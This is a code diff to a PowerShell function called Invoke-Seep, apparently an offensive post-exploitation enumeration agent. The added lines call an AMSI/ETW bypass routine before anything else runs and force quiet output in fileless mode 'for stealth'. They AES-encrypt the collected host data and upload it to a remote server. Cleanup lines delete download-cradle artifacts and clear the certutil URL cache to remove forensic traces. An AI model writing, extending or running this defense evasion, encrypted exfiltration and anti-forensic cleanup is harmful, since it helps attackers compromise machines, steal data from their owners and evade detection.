@@ -23,6 +23,17 @@ function Invoke-Seep {
     $ErrorActionPreference = "SilentlyContinue"
     $ProgressPreference    = "SilentlyContinue"
 
+    # Run evasion (AMSI/ETW/SBL bypass) before any other activity
+    Invoke-Evasion
+
+    # Detect Constrained Language Mode — many .NET calls will fail silently
+    if ($ExecutionContext.SessionState.LanguageMode -ne 'FullLanguage') {
+        $clmMode = $ExecutionContext.SessionState.LanguageMode
+        Write-Warning "[!] Constrained Language Mode detected: $clmMode"
+        Write-Warning "    .NET operations will be restricted. Results may be incomplete."
+        Write-Warning "    Consider running from an unrestricted context or using --SaveLocal."
+    }
+
     # Resolve auth token: explicit parameter overrides script-level variable
     $authToken = $Token
     if ($authToken -eq "" -and $script:SeepAuthToken) {
@@ -34,9 +45,7 @@ function Invoke-Seep {
     # =========================================================================
     # 1. Setup
     # =========================================================================
-    $script:SeepQuiet = $Quiet.IsPresent
-
-    # Determine upload URL
+    # Determine upload URL (needed before quiet decision)
     $uploadUrl = ""
     if ($Server -ne "") {
         $uploadUrl = $Server.TrimEnd("/") + "/api/results"
@@ -46,6 +55,9 @@ function Invoke-Seep {
 
     # Fileless mode: upload target set and user has not forced disk mode
     $filelessMode = ($uploadUrl -ne "") -and (-not $SaveLocal.IsPresent)
+
+    # Default to quiet in fileless mode (suppress banner/console output for stealth)
+    $script:SeepQuiet = $Quiet.IsPresent -or $filelessMode
 
     # =========================================================================
     # 2. System context
@@ -227,15 +239,41 @@ function Invoke-Seep {
             $compressedBytes = $memStream.ToArray()
             $memStream.Close()
 
+            # AES-encrypt the compressed payload if auth token is available
+            $uploadBytes = $compressedBytes
+            $encFlag = "gzip"
+            if ($authToken -ne "") {
+                try {
+                    $sha = [System.Security.Cryptography.SHA256]::Create()
+                    $aesKey = $sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($authToken))
+                    $aes = [System.Security.Cryptography.Aes]::Create()
+                    $aes.Key = $aesKey
+                    $aes.GenerateIV()
+                    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+                    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+                    $enc = $aes.CreateEncryptor()
+                    $cipherBytes = $enc.TransformFinalBlock($compressedBytes, 0, $compressedBytes.Length)
+                    # Prepend IV (16 bytes) to ciphertext
+                    $uploadBytes = New-Object byte[] ($aes.IV.Length + $cipherBytes.Length)
+                    [Array]::Copy($aes.IV, 0, $uploadBytes, 0, $aes.IV.Length)
+                    [Array]::Copy($cipherBytes, 0, $uploadBytes, $aes.IV.Length, $cipherBytes.Length)
+                    $encFlag = "aes-gzip"
+                    $enc.Dispose(); $aes.Dispose(); $sha.Dispose()
+                } catch {
+                    $uploadBytes = $compressedBytes
+                    $encFlag = "gzip"
+                }
+            }
+
             $wc = New-Object System.Net.WebClient
             $wc.Headers.Add("Content-Type", "application/octet-stream")
             $wc.Headers.Add("X-Seep-Hostname", $ctx.hostname)
             $wc.Headers.Add("X-Seep-Version",  $script:AgentVersion)
-            $wc.Headers.Add("X-Seep-Encoding", "gzip")
+            $wc.Headers.Add("X-Seep-Encoding", $encFlag)
             if ($authToken -ne "") {
                 $wc.Headers.Add("X-Seep-Token", $authToken)
             }
-            $null = $wc.UploadData($uploadUrl, "POST", $compressedBytes)
+            $null = $wc.UploadData($uploadUrl, "POST", $uploadBytes)
 
             $uploadSuccess = $true
             Write-Status "Results uploaded (fileless) to $uploadUrl" -Type "SUCCESS"
@@ -308,6 +346,14 @@ function Invoke-Seep {
             } catch {
                 Write-Status "Cleanup failed: $_" -Type "WARNING"
             }
+            # Clean up cradle download artifacts (certutil / curl)
+            foreach ($artifact in @("$env:TEMP\s.ps1", "$env:TEMP\agent.ps1")) {
+                if (Test-Path $artifact) {
+                    Remove-Item -Path $artifact -Force -ErrorAction SilentlyContinue
+                }
+            }
+            # Clear certutil URL cache entries
+            try { certutil -urlcache * delete 2>$null | Out-Null } catch {}
         }
     }
 
